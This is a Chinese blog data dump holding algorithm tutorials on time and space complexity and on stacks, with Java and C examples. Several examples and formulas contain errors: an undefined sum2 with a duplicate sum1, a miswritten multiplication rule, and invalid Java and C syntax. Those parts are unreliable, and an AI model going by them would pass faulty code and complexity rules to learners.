嵌套代码的时间复杂度等于嵌套内外代码复杂度的乘积\"></a>3、乘法法则: 嵌套代码的时间复杂度等于嵌套内外代码复杂度的乘积</h4><p>比如第二个例子中如果但看外层循环的时间复杂度是 $ O(n) $；内层循环的时间复杂度也是 $O(n)$， 因此总共的时间复杂度就是 $ T(n) = O(n) * O(n) = O(n^2) $ </p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"几种常见时间复杂度\"><a href=\"#几种常见时间复杂度\" class=\"headerlink\" title=\"几种常见时间复杂度\"></a>几种常见时间复杂度</h3></div><br></div>\n\n\n<h4 id=\"1、-O-1\"><a href=\"#1、-O-1\" class=\"headerlink\" title=\"1、$O(1)$\"></a>1、$O(1)$</h4><p>O(1) 只是常量级时间复杂度的一种表示方法，并不是指执行了一行代码。只要代码的执行时间不随n的增大而增大，这样的代码时间复杂度都可以记为O(1)。一般情况下，只要代码中不出现循环、递归等，即使有成千上万行代码，时间复杂度也是O(1)。</p>\n<h4 id=\"2、-O-logN-、O-N-logN\"><a href=\"#2、-O-logN-、O-N-logN\" class=\"headerlink\" title=\"2、$ O(logN)、O(N*logN) $\"></a>2、$ O(logN)、O(N*logN) $</h4><p>对数阶的时间复杂度非常常见，同时也是最难分析的一种。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> i = <span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"keyword\">while</span>(i &lt;= n)&#123;</span><br><span class=\"line\">  i = i * <span class=\"number\">2</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>在上述代码中，变量i从1取值，第二次为2，第三次为4，第四次为8……,所以i的取值规律为 $$ 2^0 \\&nbsp;&nbsp;&nbsp;&nbsp;  2^1 \\&nbsp;&nbsp;  2^2 \\&nbsp;&nbsp; 2^3 …  2^k… 2^x $$ 当$2^x = n$ 时，循环结束，而循环的次数即为x，所以时间复杂度也为$ O(x=\\log_2 N) $。</p>\n<p>如果把代码改为如下。那时间复杂度是多少呢？</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> i = <span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"keyword\">while</span>(i &lt;= n)&#123;</span><br><span class=\"line\">  i = i * <span class=\"number\">3</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>根据上面的思路，很容易看出这段代码的时间复杂度为$ O(log_3N) $ 。</p>\n<p>实际上，不管是以2为底，还是以3为底，亦或是以10为底，我们都把对数阶的时间复杂度记为$ O(logN) $，为什么呢？</p>\n<p>我们知道对数之间是可以互相转化的，$ log_3n$ 就可以转换为$ log_32*log_2N $，所以$ O(log_32) = O(C * log_2N) $，其中$ C = log_32 $ 是一个常量，基于前面的结论： <strong>在采用大O标记复杂度的时候，可以忽略系数，即$ O(C*f(n)) = O(f(n)) $</strong>。因此在对数阶时间复杂度的表示方法里，我们忽略的底，统一表示为$O(logN)$。</p>\n<p>如果理解了$O(logN)$，那么$O(nlogN)$就很容易了，根据前面所说的乘法法则，如果一段代码的时间复杂度是$O(logN)$，如果循环执行了 n 次，那么该代码的时间复杂度就是$O(nlogN)$。而且$O(nlogN)$是一种非常常见的时间复杂度，归并排序、快速排序的时间复杂度都是$O(nlogN)$。</p>\n<h4 id=\"2、-O-m-n-、O-m-n\"><a href=\"#2、-O-m-n-、O-m-n\" class=\"headerlink\" title=\"2、$ O(m+n)、O(m*n) $\"></a>2、$ O(m+n)、O(m*n) $</h4><p>我们再来讲跟前面都不一样的时间复杂度，代码的时间复杂度由两个数据规模来决定。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">func</span><span class=\"params\">(<span class=\"keyword\">int</span> m, <span class=\"keyword\">int</span> n)</span></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> sum1 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">1</span>; i&lt;=m; i++)&#123;</span><br><span class=\"line\">    sum1 += i;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">int</span> sum1 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> j=<span class=\"number\">1</span>; j&lt;=m; j++)&#123;</span><br><span class=\"line\">    sum1 += j;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> sum1+sum2;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>从代码中看出，m和n表示两个不同的数据规模，我们无法事先评估m和n的量级大小，所以我们在分析复杂度时，就不能简单用加法法则忽略一个，因此上面代码的时间复杂度为$O(m + n)$，</p>\n<p>针对这种情况，加法原则就不正确了，我们将加法原则改为：$ T1(m) + T2(n) = O(f(m) + g(n)) $，但是乘法法则继续有效：$ T1(m) + T2(n) = O(f(m) * f(n)) $。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"空间复杂度\"><a href=\"#空间复杂度\" class=\"headerlink\" title=\"空间复杂度\"></a>空间复杂度</h3></div><br></div>\n\n<p>前面讲过，时间复杂度的全称是渐近时间复杂度，表示算法的执行时间与数据规模之间的增长关系。类比一下，空间复杂度的全称就是渐进空间复杂度，表示算法的存储空间与数据规模的增长关系。</p>\n<p>还是拿具体的例子说明(仅供测试,一般没人这么写)</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">func</span><span class=\"params\">(<span class=\"keyword\">int</span> n)</span></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> i = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">int</span>[] a = <span class=\"keyword\">new</span> <span class=\"keyword\">int</span>[n];</span><br><span class=\"line\">  <span class=\"keyword\">for</span>(i; i&lt;n; i++)&#123;</span><br><span class=\"line\">    a[i] = i*<span class=\"number\">1</span>;</span><br><span class=\"line\">    print(a[i]);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>和分析时间复杂度一样，我们看到第二行申请了一个空间变量i，但是它是常量阶的，跟数据规模n无关，所以可以忽略，第三行申请了一个大小为n的int数组，除此之外，该代码没有占据更多的空间O(n).</p>\n<p>我们常见的空间复杂度就是$O(1)、O(n)、O(n^2)$，像$ O(logN)、O(nlogN) $ 这样的对数阶复杂度平时都用不到。空间复杂度分析相对时间复杂度要简单得多。</p>\n<p><br></p>\n"},{"title":"算法-栈","date":"2018-09-14T16:18:36.000Z","_content":"\n<div style=\"text-align: center;\">\n{% note success %} \n### 前言\n{% endnote %}\n</div>\n\n浏览器的前进、后退功能，我想你肯定很熟悉吧？\n\n当你依次访问完一连串页面a-b-c-d之后，点击浏览器的后退按钮，就可以查看之前浏览过的页面c-b-a。当后退到a页面之后，点击前进按钮，可以重新进入页面b-c-d。但是如果进入页面b之后，点击了两一个页面，那就无法通过前进后退页面进入c-d了。\n\n假如你是浏览器的开发设计者，你会如何实现这个功能呢？带着这个问题，我们来看一下“栈”这个数据结构。\n\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 如何理解栈？\n{% endnote %}\n</div>\n\n关于栈，举一个非常贴切的例子。比如叠盘子，我们放盘子的时候都是从下往上一个一个放。取的时候，我们也是从上往下一个一个取，不能从中间抽取。**先进者后出，后进者先出，这就是典型的栈结构**。\n\n从栈的操作特性上来看，**栈是一种操作受限的线性表**，只允许在一端插入和删除数据。\n\n我第一次接触这种数据结构的时候，就对它存在的意义产生了很大的疑惑。因为相比数组和链表，栈带给我的只有限制，并没有任何优势。那我直接使用数组或者链表就好了？为什么还要用这个“操作受限”的数据结构呢？\n\n事实上，从功能上来说，数组和链表确实可以代替栈，但是你要知道，特定的数据结构是对特定场景的抽象，而且数组和链表暴露了太多的操作接口，操作上的确灵活自由，但使用时就比较不可控，自然就更容易出错。\n\n**当某个数据集合只涉及在一端插入和删除数据时，并且满足先进后出、后进先出的特性，我们就应该用栈这种数据结构**。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 如何实现一个栈？\n{% endnote %}\n</div>\n\n从刚才栈的定义里可以看出，栈主要包含两个操作，入栈和出栈。也就是在在栈顶插入一个数据和从栈顶删除一个数据。理解了栈的定义之后，我们来看一看如何用代码实现一个栈。\n\n实际上，栈可以用数组来实现，也可以用链表来实现。用数组实现的栈，我们叫做**顺序栈**，用链表实现的栈，我们叫做**链式栈**。\n\n\n#### 基于数组实现的顺序栈\n\n我这里用Java实现一个基于数组的顺序栈，基于链表的实现，可以自己写一下。\n\n```java\n// 基于数组实现的链式栈\npublic class ArrayStack<T> implements stack<T> {\n    private final Object [] DEFAULT_ARRAY = new Object[10];\n    private final int DEFAULT_CAP = 10;\n    private Object[] data;\n    private int  cap;\n    private int size;\n\n    public ArrayStack() {\n        this.cap = DEFAULT_CAP;\n        this.size = 0;\n        this.data = DEFAULT_ARRAY;\n    }\n    public ArrayStack(int cap){\n        if (cap < 0) throw new IllegalArgumentException(\"Illegal Capacity: \"+ cap);\n        this.cap = cap;\n        this.data = new Object[cap];\n    }\n    public void push(T val) {\n        if (size<cap){\n            // 数组满了\n            data[size] = val;\n            size++;\n        }else {\n          throw new Runtime(\"stack is full!\")\n          // 可以动态扩容的stack\n          // Object[] objects = new Object[cap*2];\n          // System.arraycopy(data, 0, objects, 0, size);\n          // data = objects;\n          // data[size] = val;\n          // size ++;\n        }\n    }\n    public T pop() {\n        if (size == 0) return null;\n        T result = (T) data[size-1];\n        size--;\n        return result;\n    }\n}\n\n```\n\n了解了定义和基本操作，那它的操作时间、空间复杂度是多少呢？\n\n不管是链式栈还是顺序栈，我们存储数据需要一个大小为n的数组就够了。在入栈和出栈的过程中，只需要一两个临时变量存储空间，因此时间复杂度是O(1)。\n\n注意这里存储数据需要一个大小为n的数组，并不是说空间复杂度是O(n)，因为这n个空间是必须的，无法省掉。所以我们说空间复杂度的时候，是指除了原本的数据存储空间外，算法运行还需要额外的存储空间。\n\n时间复杂度分析：不管是入栈、出栈，都只涉及栈顶个别数据的操作，因此时间复杂度为O(1)。\n\n#### 支持动态扩容的顺序栈\n\n刚才那个基于数组实现的顺序栈，是一个固定大小的栈，也就是说，在初始化后需要实现指定栈的大小，当栈满之后，就无法在王栈里添加数据了，尽管链式栈的大小不受限，但是要存储next指针，内存消耗相对较多。那我们如何实现一个可以支持动态扩容的栈呢？\n\n还记得，在数组那一节，要如何来实现一个支持动态扩容的数组吗？当数组空间不足时，我们重新申请一块更大的内存，将原来数组中的数据拷贝过去，这样就实现了一个支持动态扩容的数组。\n\n所以，如果实现一个支持动态扩容的栈，我们只需要底层依赖一个支持动态扩容的数组就可以了。当栈满了之后，我们就申请一个更大的数组，将原来的数据搬移到新的数组中。\n\n\n实际上，支持动态扩容的顺序栈，我们开发中并不经常用到。这块我们复习一下复杂度分析方法。现在我们来分析一下支持动态扩容的顺序栈的入栈、出栈时间复杂度。\n\n对于出栈操作来说，不会涉及到内存的重新申请和数据搬移，所以出栈的时间复杂度仍然是O(1)。但是对于入栈操作来说，情况就不一样了，当栈中有空闲空间时，入栈操作时间复杂度为O(1)，当栈中没有空间不够时，就需要重新申请内存和数据搬移，所以时间复杂度就变成了O(n)。\n\n也就是说，对于入栈操作来说，最好时间复杂度为O(1)，最坏情况时间复杂度为O(n)。那平均情况下的时间复杂度是多少呢？还记得时间复杂度分析方法中的摊还分析法吗？这个入栈操作的平均情况的时间按复杂度正好可以用摊还分析法来分析。\n\n为了分析方便，我们先做一些假设和定义：\n* 栈空间不够时，我们重新申请一个是原来大小两倍的数组；\n* 为了简化分析，假设只有入栈操作没有出栈操作；\n* 定义不涉及内存搬移操作的入栈操作为simple-push操作，时间复杂度为O(1)。\n\n如果当前栈大小为K，并且已满，当在有新的的数据要入栈时，就需要重新申请2倍大小的内存，并且做K个数据的搬移操作，然后在入栈。但是，接下来的K-1次入栈操作，我们都不需要在重新申请内存和搬移数据，所以这k-1次都只需要一次simple-push操作就可以完成。如下图：\n\n{% asset_img 入栈时间复杂度.jpg %}\n\n从上图看出，这K次入栈操作，总共涉及了K个数据的搬移，以及K次simple-push操作。讲K个数据搬移均摊到K次入栈操作，那每个入栈操作只需要一个数据搬移和一个simpel-push操作。以此类推，入栈操作的时间复杂度为O(1)。\n\n通过这个例子分析，也验证了前面讲的，均摊时间复杂度一般都等于最好时间复杂度。因为在大部分情况下，入栈操作的时间复杂度都是O(1)，只有在个别情况才会退化为O(n)，所以把耗时多的入栈操作的时间均摊到其他入栈操作上，平均情况下耗时就接近O(1)。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 栈的应用场景\n{% endnote %}\n</div>\n\n#### 栈在函数调用中的应用\n\n前面讲的都比较偏理论，我们现在来看，栈在软件工程中的实际应用。栈作为一个比较基础的数据结构，应用场景还是蛮多的。其中比较经典的一个应用场景就是函数调用栈。\n\n我们知道，操作系统给每个线程分配了一块独立的内存空间，这块内存空间被组织成“栈”这种结构，用来存储函数调用时的临时变量。每进入一个函数，就会将临时变量作为一个栈帧入栈，当被调用函数执行完成，返回之后，将这个函数对应的栈帧出栈。为了更好理解函数调用栈，一起来看一下这段代码的执行过程。\n\n```C\nint main(){\n  int a = 1;\n  int ret = 0;\n  int res = 0;\n  ret = add(3,5);\n  res = a + ret;\n  printf(\"%d\", res);\n  return 0;\n}\n\nint add(int x, int y){\n  int sum = 0;\n  sum = x + y;\n  return sum;\n}\n```\n\n从代码中我们可以看出，main函数调用了add函数，获取计算结果，并且与临时变量a相加，最后打印res的值，为了清晰的看到这个过程的函数栈里对应的入栈、出栈过程，我这里画了一张函数栈图：\n\n{% asset_img 函数栈.jpg %}\n\n#### 栈在表达式求值中的应用\n\n我们再来看一个栈的常见应用场景，编译器如何利用栈实现**表达式求值**。\n\n这里我们用一个只包含加减乘除四则运算的表达式来解释，比如：34+13\\*9+44-12/3。对于这个四则运算，我们人脑可以很快算出来，但是对于计算机来说，理解这个表达式本身就是个挺难的事。如果是你，你会怎么实现一个表达式求值的功能呢？\n\n实际上，编译器就是通过两个栈来实现的。其中一个是保存操作数的栈，另一个保存运算符的栈。我们从左往右遍历表达式，当遇到数字，我们直接压入操作数栈。当遇到运算符，就与运算符的栈顶元素进行比较。如果运算符比当前栈顶元素的优先级高，就直接压入运算符栈中，如果比栈顶元素的优先级低或者相同，就将当前栈顶元素取出，再从操作数栈中取出两个操作数，然后进行运算，再把计算完的结果压入操作数栈，继续比较。\n\n这里用一个简单的例子：3+5\\*8-6 我将这个表达式的计算过程画成一个图，结合图来理解刚才的计算过程。\n\n{% asset_img 表达式栈图.jpg %}\n\n#### 栈在括号匹配中的应用\n\n出了用栈来实现表达式求值，我们还可以借助栈来检查表达式中的括号是否匹配。\n\n我们同样简化一下背景，假设表达式只包含三种括号，圆括号()、方括号[]、花括号{}，并且他们可以任意嵌套。比如{[{}]}、[([]){()}]等都为合法格式，而{[}()或[{(}]为非法格式。那现在给你一个包含三种括号的表达式字符串，如何检查它是否合法呢？\n\n这里也可以用栈来解决。我们用栈来保存未匹配的左括号，从做到右一次扫描字符串。当扫描到左括号时，则将其压入栈中，当扫描到右括号时，从栈顶取出一个左括号。如果能够匹配，比如\"(\"和\")\"匹配、\"[\"和\"]\"匹配、\"{\"和\"}\"匹配，则继续扫描剩下的字符串。如果扫描过程中，遇到不能匹配的右括号，或者栈中没有数据，则说明为非法格式。\n\n当所有的括号都扫描完成后，如果栈为空，则说明字符串为合法格式；否则说明有为匹配的左括号，为非法格式。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 解答开篇\n{% endnote %}\n</div>\n\n好了，理解了栈的概念和应用，再回头看看开篇的问题。如何实现浏览器的前进、后退功能？学过栈之后，就可以用两个栈完美的解决这个问题了。\n\n我们使用两个栈X、Y，把首次浏览的页面压入栈X，当点击后退按钮时，依次从栈X中出栈，并将出栈的数据依次放入栈Y。当我们点击前进按钮时，依次取出栈Y中的数据，并放入栈X。当X中没有数据时，说明没有页面可以后退了。当Y中没有数据时，说明没有页面可以点击前进按钮进行浏览了。\n\n当我们依次浏览了a、b、c三个页面，我们依次把a、b、c压入栈，这个时候，两个栈的数据就是如下这个样子：\n\n{% asset_img 浏览器栈1.jpg %}\n\n当我们通过浏览器的后退按钮，从页面c后退到页面a之后，我们依次把c、b从栈X中弹出，并且依次放入栈Y中，这个时候栈中的数据就是如下：\n\n{% asset_img 浏览器栈2.jpg %}\n\n这时候，又想看页面b，于是点击前进按钮回到b页面，我们就把b再从栈Y中取出，放入X，此时栈中数据如下：\n\n{% asset_img 浏览器栈3.jpg %}\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 总结\n{% endnote %}\n</div>\n\n栈是一种操作受限的数据结构，只支持入栈和出栈操作。后进先出是它的最大特点。栈既可以通过数组来实现，也可以通过链表来实现。不管是数组实现的栈，还是链表实现的栈，他们的入栈、出栈时间复杂度都为O(1)。在基于数组实现的动态扩容的顺序栈中，时间复杂度均为O(1)，重点是入栈时间复杂度中关于摊还分析法的掌握。\n\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 思考\n{% endnote %}\n</div>\n\n1、再讲栈的应用时，讲到用函数调用栈来保存临时变量，为什么函数调用要用\"栈\"这种数据结构来保存临时变量呢？用其他数据结构可以吗？\n2、我们知道，JVM内存管理中有个“堆栈”的概念。栈内存用来白村局部变量和方法调用，堆内存用来存储java中的对象。那JVM里面的“栈”和我们这里的“栈”一样吗？不一样的话，为什么叫“栈”呢？\n\n<br>\n","source":"_posts/算法-栈.md","raw":"---\ntitle: 算法-栈\ndate: 2018-09-15 00:18:36\ntags: ['算法','栈']\ncategories: 算法\n---\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 前言\n{% endnote %}\n</div>\n\n浏览器的前进、后退功能，我想你肯定很熟悉吧？\n\n当你依次访问完一连串页面a-b-c-d之后，点击浏览器的后退按钮，就可以查看之前浏览过的页面c-b-a。当后退到a页面之后，点击前进按钮，可以重新进入页面b-c-d。但是如果进入页面b之后，点击了两一个页面，那就无法通过前进后退页面进入c-d了。\n\n假如你是浏览器的开发设计者，你会如何实现这个功能呢？带着这个问题，我们来看一下“栈”这个数据结构。\n\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 如何理解栈？\n{% endnote %}\n</div>\n\n关于栈，举一个非常贴切的例子。比如叠盘子，我们放盘子的时候都是从下往上一个一个放。取的时候，我们也是从上往下一个一个取，不能从中间抽取。**先进者后出，后进者先出，这就是典型的栈结构**。\n\n从栈的操作特性上来看，**栈是一种操作受限的线性表**，只允许在一端插入和删除数据。\n\n我第一次接触这种数据结构的时候，就对它存在的意义产生了很大的疑惑。因为相比数组和链表，栈带给我的只有限制，并没有任何优势。那我直接使用数组或者链表就好了？为什么还要用这个“操作受限”的数据结构呢？\n\n事实上，从功能上来说，数组和链表确实可以代替栈，但是你要知道，特定的数据结构是对特定场景的抽象，而且数组和链表暴露了太多的操作接口，操作上的确灵活自由，但使用时就比较不可控，自然就更容易出错。\n\n**当某个数据集合只涉及在一端插入和删除数据时，并且满足先进后出、后进先出的特性，我们就应该用栈这种数据结构**。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 如何实现一个栈？\n{% endnote %}\n</div>\n\n从刚才栈的定义里可以看出，栈主要包含两个操作，入栈和出栈。也就是在在栈顶插入一个数据和从栈顶删除一个数据。理解了栈的定义之后，我们来看一看如何用代码实现一个栈。\n\n实际上，栈可以用数组来实现，也可以用链表来实现。用数组实现的栈，我们叫做**顺序栈**，用链表实现的栈，我们叫做**链式栈**。\n\n\n#### 基于数组实现的顺序栈\n\n我这里用Java实现一个基于数组的顺序栈，基于链表的实现，可以自己写一下。\n\n```java\n// 基于数组实现的链式栈\npublic class ArrayStack<T> implements stack<T> {\n    private final Object [] DEFAULT_ARRAY = new Object[10];\n    private final int DEFAULT_CAP = 10;\n    private Object[] data;\n    private int  cap;\n    private int size;\n\n    public ArrayStack() {\n        this.cap = DEFAULT_CAP;\n        this.size = 0;\n        this.data = DEFAULT_ARRAY;\n    }\n    public ArrayStack(int cap){\n        if (cap < 0) throw new IllegalArgumentException(\"Illegal Capacity: \"+ cap);\n        this.cap = cap;\n        this.data = new Object[cap];\n    }\n    public void push(T val) {\n        if (size<cap){\n            // 数组满了\n            data[size] = val;\n            size++;\n        }else {\n          throw new Runtime(\"stack is full!\")\n          // 可以动态扩容的stack\n          // Object[] objects = new Object[cap*2];\n          // System.arraycopy(data, 0, objects, 0, size);\n          // data = objects;\n          // data[size] = val;\n          // size ++;\n        }\n    }\n    public T pop() {\n        if (size == 0) return null;\n        T result = (T) data[size-1];\n        size--;\n        return result;\n    }\n}\n\n```\n\n了解了定义和基本操作，那它的操作时间、空间复杂度是多少呢？\n\n不管是链式栈还是顺序栈，我们存储数据需要一个大小为n的数组就够了。在入栈和出栈的过程中，只需要一两个临时变量存储空间，因此时间复杂度是O(1)。\n\n注意这里存储数据需要一个大小为n的数组，并不是说空间复杂度是O(n)，因为这n个空间是必须的，无法省掉。所以我们说空间复杂度的时候，是指除了原本的数据存储空间外，算法运行还需要额外的存储空间。\n\n时间复杂度分析：不管是入栈、出栈，都只涉及栈顶个别数据的操作，因此时间复杂度为O(1)。\n\n#### 支持动态扩容的顺序栈\n\n刚才那个基于数组实现的顺序栈，是一个固定大小的栈，也就是说，在初始化后需要实现指定栈的大小，当栈满之后，就无法在王栈里添加数据了，尽管链式栈的大小不受限，但是要存储next指针，内存消耗相对较多。那我们如何实现一个可以支持动态扩容的栈呢？\n\n还记得，在数组那一节，要如何来实现一个支持动态扩容的数组吗？当数组空间不足时，我们重新申请一块更大的内存，将原来数组中的数据拷贝过去，这样就实现了一个支持动态扩容的数组。\n\n所以，如果实现一个支持动态扩容的栈，我们只需要底层依赖一个支持动态扩容的数组就可以了。当栈满了之后，我们就申请一个更大的数组，将原来的数据搬移到新的数组中。\n\n\n实际上，支持动态扩容的顺序栈，我们开发中并不经常用到。这块我们复习一下复杂度分析方法。现在我们来分析一下支持动态扩容的顺序栈的入栈、出栈时间复杂度。\n\n对于出栈操作来说，不会涉及到内存的重新申请和数据搬移，所以出栈的时间复杂度仍然是O(1)。但是对于入栈操作来说，情况就不一样了，当栈中有空闲空间时，入栈操作时间复杂度为O(1)，当栈中没有空间不够时，就需要重新申请内存和数据搬移，所以时间复杂度就变成了O(n)。\n\n也就是说，对于入栈操作来说，最好时间复杂度为O(1)，最坏情况时间复杂度为O(n)。那平均情况下的时间复杂度是多少呢？还记得时间复杂度分析方法中的摊还分析法吗？这个入栈操作的平均情况的时间按复杂度正好可以用摊还分析法来分析。\n\n为了分析方便，我们先做一些假设和定义：\n* 栈空间不够时，我们重新申请一个是原来大小两倍的数组；\n* 为了简化分析，假设只有入栈操作没有出栈操作；\n* 定义不涉及内存搬移操作的入栈操作为simple-push操作，时间复杂度为O(1)。\n\n如果当前栈大小为K，并且已满，当在有新的的数据要入栈时，就需要重新申请2倍大小的内存，并且做K个数据的搬移操作，然后在入栈。但是，接下来的K-1次入栈操作，我们都不需要在重新申请内存和搬移数据，所以这k-1次都只需要一次simple-push操作就可以完成。如下图：\n\n{% asset_img 入栈时间复杂度.jpg %}\n\n从上图看出，这K次入栈操作，总共涉及了K个数据的搬移，以及K次simple-push操作。讲K个数据搬移均摊到K次入栈操作，那每个入栈操作只需要一个数据搬移和一个simpel-push操作。以此类推，入栈操作的时间复杂度为O(1)。\n\n通过这个例子分析，也验证了前面讲的，均摊时间复杂度一般都等于最好时间复杂度。因为在大部分情况下，入栈操作的时间复杂度都是O(1)，只有在个别情况才会退化为O(n)，所以把耗时多的入栈操作的时间均摊到其他入栈操作上，平均情况下耗时就接近O(1)。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 栈的应用场景\n{% endnote %}\n</div>\n\n#### 栈在函数调用中的应用\n\n前面讲的都比较偏理论，我们现在来看，栈在软件工程中的实际应用。栈作为一个比较基础的数据结构，应用场景还是蛮多的。其中比较经典的一个应用场景就是函数调用栈。\n\n我们知道，操作系统给每个线程分配了一块独立的内存空间，这块内存空间被组织成“栈”这种结构，用来存储函数调用时的临时变量。每进入一个函数，就会将临时变量作为一个栈帧入栈，当被调用函数执行完成，返回之后，将这个函数对应的栈帧出栈。为了更好理解函数调用栈，一起来看一下这段代码的执行过程。\n\n```C\nint main(){\n  int a = 1;\n  int ret = 0;\n  int res = 0;\n  ret = add(3,5);\n  res = a + ret;\n  printf(\"%d\", res);\n  return 0;\n}\n\nint add(int x, int y){\n  int sum = 0;\n  sum = x + y;\n  return sum;\n}\n```\n\n从代码中我们可以看出，main函数调用了add函数，获取计算结果，并且与临时变量a相加，最后打印res的值，为了清晰的看到这个过程的函数栈里对应的入栈、出栈过程，我这里画了一张函数栈图：\n\n{% asset_img 函数栈.jpg %}\n\n#### 栈在表达式求值中的应用\n\n我们再来看一个栈的常见应用场景，编译器如何利用栈实现**表达式求值**。\n\n这里我们用一个只包含加减乘除四则运算的表达式来解释，比如：34+13\\*9+44-12/3。对于这个四则运算，我们人脑可以很快算出来，但是对于计算机来说，理解这个表达式本身就是个挺难的事。如果是你，你会怎么实现一个表达式求值的功能呢？\n\n实际上，编译器就是通过两个栈来实现的。其中一个是保存操作数的栈，另一个保存运算符的栈。我们从左往右遍历表达式，当遇到数字，我们直接压入操作数栈。当遇到运算符，就与运算符的栈顶元素进行比较。如果运算符比当前栈顶元素的优先级高，就直接压入运算符栈中，如果比栈顶元素的优先级低或者相同，就将当前栈顶元素取出，再从操作数栈中取出两个操作数，然后进行运算，再把计算完的结果压入操作数栈，继续比较。\n\n这里用一个简单的例子：3+5\\*8-6 我将这个表达式的计算过程画成一个图，结合图来理解刚才的计算过程。\n\n{% asset_img 表达式栈图.jpg %}\n\n#### 栈在括号匹配中的应用\n\n出了用栈来实现表达式求值，我们还可以借助栈来检查表达式中的括号是否匹配。\n\n我们同样简化一下背景，假设表达式只包含三种括号，圆括号()、方括号[]、花括号{}，并且他们可以任意嵌套。比如{[{}]}、[([]){()}]等都为合法格式，而{[}()或[{(}]为非法格式。那现在给你一个包含三种括号的表达式字符串，如何检查它是否合法呢？\n\n这里也可以用栈来解决。我们用栈来保存未匹配的左括号，从做到右一次扫描字符串。当扫描到左括号时，则将其压入栈中，当扫描到右括号时，从栈顶取出一个左括号。如果能够匹配，比如\"(\"和\")\"匹配、\"[\"和\"]\"匹配、\"{\"和\"}\"匹配，则继续扫描剩下的字符串。如果扫描过程中，遇到不能匹配的右括号，或者栈中没有数据，则说明为非法格式。\n\n当所有的括号都扫描完成后，如果栈为空，则说明字符串为合法格式；否则说明有为匹配的左括号，为非法格式。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 解答开篇\n{% endnote %}\n</div>\n\n好了，理解了栈的概念和应用，再回头看看开篇的问题。如何实现浏览器的前进、后退功能？学过栈之后，就可以用两个栈完美的解决这个问题了。\n\n我们使用两个栈X、Y，把首次浏览的页面压入栈X，当点击后退按钮时，依次从栈X中出栈，并将出栈的数据依次放入栈Y。当我们点击前进按钮时，依次取出栈Y中的数据，并放入栈X。当X中没有数据时，说明没有页面可以后退了。当Y中没有数据时，说明没有页面可以点击前进按钮进行浏览了。\n\n当我们依次浏览了a、b、c三个页面，我们依次把a、b、c压入栈，这个时候，两个栈的数据就是如下这个样子：\n\n{% asset_img 浏览器栈1.jpg %}\n\n当我们通过浏览器的后退按钮，从页面c后退到页面a之后，我们依次把c、b从栈X中弹出，并且依次放入栈Y中，这个时候栈中的数据就是如下：\n\n{% asset_img 浏览器栈2.jpg 